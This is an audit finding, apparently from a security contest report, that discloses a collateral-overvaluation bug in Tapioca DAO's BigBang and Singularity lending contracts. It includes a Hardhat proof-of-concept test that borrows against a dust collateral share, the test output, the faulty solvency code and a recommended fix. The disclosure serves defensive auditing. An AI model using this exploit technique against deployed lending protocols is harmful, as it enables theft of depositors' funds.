@@ -1,0 +1,35 @@
+[H-45]SGLLiquidation::_computeAssetAmountToSolvency,Market::_isSolventandMarket::_computeMaxBorrowableAmountmay overestimate the collateral, resulting in false solvency
+Submitted byzzzitron
+https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L415-L421
+https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L385-L399
+https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L781-L785
+https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/singularity/SGLLiquidation.sol#L80-L87
+An user can borrow viaBigBang::borrowwhen there is no collateral amount from the user’s share. TheBigBangwill falsely consider the position as solvent, when it is not, resulting in a loss.
+A similar issue presents in the Singularity asSGLLiquidation::_computeAssetAmountToSolvencywill overestimate the collateral, therefore liquidate less than it should.
+Proof of Concept
+The following proof of concept demonstrates that au user could borrow some assets, even though the collateral share will not give any amount of collateral.
+Put the full PoC in the following gist intotest/bigBang.test.tsin tapiocabar-audit.
+https://gist.github.com/zzzitron/14482ea3ab35b08421e7751bac0c2e3f
+it('considers me solvent even when I have enough share for any amount PoCBorrow',async()=>{///////// setup is omitted// full poc is https://gist.github.com/zzzitron/14482ea3ab35b08421e7751bac0c2e3f///////constwethCollateralShare=ethers.BigNumber.from((1e8).toString()).sub(1);awaitwethBigBangMarket.addCollateral(deployer.address,deployer.address,false,0,wethCollateralShare,// valShare,);// logletuserCollateralShare=awaitwethBigBangMarket.userCollateralShare(deployer.address);console.log("userCollateralShare: ",userCollateralShare.toString());letuserCollateralShareToAmount=awaityieldBox.toAmount(wethAssetId,userCollateralShare,false);console.log("userCollateralShareToAmount: ",userCollateralShareToAmount.toString());letcollateralPartInAsset= (awaityieldBox.toAmount(wethAssetId,userCollateralShare.mul(1e13).mul(75000),false))console.log("collateralPart in asset times exchangerRate",collateralPartInAsset.toString())constexchangeRate=awaitwethBigBangMarket.exchangeRate();console.log("exchangeRate:",exchangeRate.toString());console.log("can borrow this much:",collateralPartInAsset.div(exchangeRate).toString());//borrow even though the collateral share is not enough for any amount of collateralconstusdoBorrowVal=collateralPartInAsset.div(exchangeRate).sub(1)awaitwethBigBangMarket.borrow(deployer.address,deployer.address,usdoBorrowVal,);letuserBorrowPart=awaitwethBigBangMarket.userBorrowPart(deployer.address,);expect(userBorrowPart.gt(0)).to.be.true;console.log(userBorrowPart.toString())});
+The result of the test is:
+BigBang testpocuserCollateralShare:  99999999userCollateralShareToAmount:  0collateralPart in asset times exchangerRate 749999992500000000exchangeRate: 1000000000000000can borrow this much: 749748✔ considers me solvent even when I have enough share for any amount PoCBorrow (12405ms)
+In the scenario above, The deployer is adding share of collateral to the bigbang usingBigBang::addCollateral. The added amount in the below example is (1e8 - 1), which is too small to get any collateral from the YieldBox, as theyieldBox.toAmountis zero.
+However, due to the calculation error in theMarket::_isSolvent, the deployer could borrow 748 of asset. Upon withdrawing the yieldBox will give zero amount of collateral, but the BigBang let the user borrow non zero amount of asset.
+Similarly one can show thatSingularitywill liquidate less than it should, due to similar calculation error.
+details of the bug
+The problem stems from the calculation error, where multiplies the user’s collateral share withEXCHANGE_RATE_PRECISIONandcollateralizationRatebefore callingyieldBox.toAmount.
+It will give inflated amount, resulting in false solvency.
+https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L415-L421
+returnyieldBox.toAmount(collateralId,collateralShare*(EXCHANGE_RATE_PRECISION/FEE_PRECISION) *collateralizationRate,false) >=
+The same calculation happens in theMarket::_computeMaxBorrowableAmount
+https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L385-L399
+In the BigBang’s liquidating logic (e.i. in theBigBang::_updateBorrowAndCollateralShare), the conversion from the share of collateral to the asset is calculated correctly:
+https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L781-L785
+uint256collateralPartInAsset= (yieldBox.toAmount(collateralId,userCollateralShare[user],false) *EXCHANGE_RATE_PRECISION) /_exchangeRate;
+However, the position in question will not get to this logic, even ifBigBang::liquidateis called on the position, since the_isSolventwill falsely consider the position as solvent.
+Similarly theSingularitywill overestimate the collateral in the same manner.
+https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/singularity/SGLLiquidation.sol#L70-L90
+function_computeAssetAmountToSolvency(addressuser,uint256_exchangeRate)privateviewreturns(uint256) {// accrue must have already been called!uint256borrowPart=userBorrowPart[user];if(borrowPart==0)return0;uint256collateralShare=userCollateralShare[user];Rebasememory_totalBorrow=totalBorrow;uint256collateralAmountInAsset=yieldBox.toAmount(collateralId,(collateralShare*(EXCHANGE_RATE_PRECISION/FEE_PRECISION) *lqCollateralizationRate),false) /_exchangeRate;// Obviously it's not `borrowPart` anymore but `borrowAmount`borrowPart= (borrowPart*_totalBorrow.elastic) /_totalBorrow.base;
+Recommended Mitigation Steps
+TheMarket::_isSolventandMarket::_computeMaxBorrowableAmountshould evaluate the value of collateral likeBigBang::_updateBorrowAndCollateralSharefunction, (e.i. calculate the exchangeRate and collateralizationRate after converting the share to asset).
+0xRektora (Tapioca) confirmed
